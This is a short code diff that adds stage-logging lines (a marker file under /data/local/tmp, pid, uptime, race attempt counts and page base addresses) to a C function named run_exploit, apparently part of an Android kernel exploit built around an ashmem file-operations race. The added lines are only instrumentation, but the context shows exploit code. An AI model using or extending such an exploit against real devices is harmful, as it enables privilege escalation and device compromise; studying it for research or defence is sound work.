@@ -432,6 +432,10 @@ int run_exploit(int argc, char **argv) {
   set_limit();
   log_startup_context();
   init_ashmem_path();
+  unlink("/data/local/tmp/cve-stage.marker");
+  struct timespec ts;
+  (void)clock_gettime(CLOCK_MONOTONIC, &ts);
+  stage_marker("run:start pid=%d uptime_sec=%lld", getpid(), (long long)ts.tv_sec);
 
   pin_to_core(CORE);
 #if defined(SLIDE_STACK_WRITER) && \
@@ -569,6 +573,8 @@ int run_exploit(int argc, char **argv) {
         continue;
       }
     }
+    stage_marker("main:fops_race_attempt=%d/%d page_base=%016zx",
+                 attempt, fops_fresh_page_attempts, page_base);
     int triggered = app_trigger_fops_slide_route();
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 #if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
